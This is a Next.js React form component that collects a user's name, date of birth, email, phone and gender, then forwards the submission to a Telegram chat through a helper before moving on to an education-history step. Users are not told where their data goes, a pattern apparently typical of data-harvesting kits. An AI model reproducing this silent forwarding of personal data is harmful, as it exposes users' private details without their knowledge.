"use client";
import { sendTelegramMessage } from "../../../utils/telegram";

import { useState } from "react";
import { useRouter } from "next/navigation";

const PersonalInformationForm = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    email: "",
    confirmEmail: "",
    phoneNumber: "",
    gender: ""
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.firstName.trim()) newErrors.firstName = "First name is required";
    if (!formData.lastName.trim()) newErrors.lastName = "Last name is required";
    if (!formData.dob) newErrors.dob = "Date of Birth is required";
    if (!formData.email.trim()) newErrors.email = "Email is required";
    if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = "Emails do not match";
    if (!formData.phoneNumber.trim()) newErrors.phoneNumber = "Phone Number is required";
    if (!formData.gender) newErrors.gender = "Gender is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }


      // Send the form data to Telegram
  const message = `New User Form Submission:\n
  First Name: ${formData.firstName}\n
  Last Name: ${formData.lastName}\n
  Date of Birth: ${formData.dob}\n
  Email: ${formData.email}\n
  Gender: ${formData.gender}\n
  Phone Number: ${formData.phoneNumber}`;
  
  // Call the function to send the message to Telegram
  await sendTelegramMessage(message);
    console.log("Form Submitted", formData);
    router.push("/education-history");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-green-600 shadow-md">
        <div className="max-w-3xl mx-auto p-4 flex items-center">
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3"/>
          <div className="flex-1 ml-2">
            <div className="h-2 bg-green-500 rounded-full mt-1">
              <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
            </div>
          </div>
        </div>
      </header>
      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Personal Information</h1>
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">First Name</label>
              <input
                value={formData.firstName}
                onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                className={`w-full mt-2 border ${errors.firstName ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.firstName && <p className="text-red-500 text-sm mt-1">{errors.firstName}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Last Name</label>
              <input
                value={formData.lastName}
                onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                className={`w-full mt-2 border ${errors.lastName ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.lastName && <p className="text-red-500 text-sm mt-1">{errors.lastName}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Date of Birth</label>
              <input
                type="date"
                value={formData.dob}
                onChange={(e) => setFormData({ ...formData, dob: e.target.value })}
                className={`w-full mt-2 border ${errors.dob ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.dob && <p className="text-red-500 text-sm mt-1">{errors.dob}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Gender</label>
              <select
                value={formData.gender}
                onChange={(e) => setFormData({ ...formData, gender: e.target.value })}
                className={`w-full mt-2 border ${errors.gender ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              >
                <option value="">Select Gender</option>
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                <option value="Other">Other</option>
              </select>
              {errors.gender && <p className="text-red-500 text-sm mt-1">{errors.gender}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Email</label>
              <input
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                className={`w-full mt-2 border ${errors.email ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Confirm Email</label>
              <input
                type="email"
                value={formData.confirmEmail}
                onChange={(e) => setFormData({ ...formData, confirmEmail: e.target.value })}
                className={`w-full mt-2 border ${errors.confirmEmail ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.confirmEmail && <p className="text-red-500 text-sm mt-1">{errors.confirmEmail}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Phone Number</label>
              <input
                value={formData.phoneNumber}
                onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
                className={`w-full mt-2 border ${errors.phoneNumber ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
            </div>

            <button type="submit" className="w-full bg-green-500  text-white p-4 rounded-xl hover:bg-green-600">
              Next
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PersonalInformationForm;
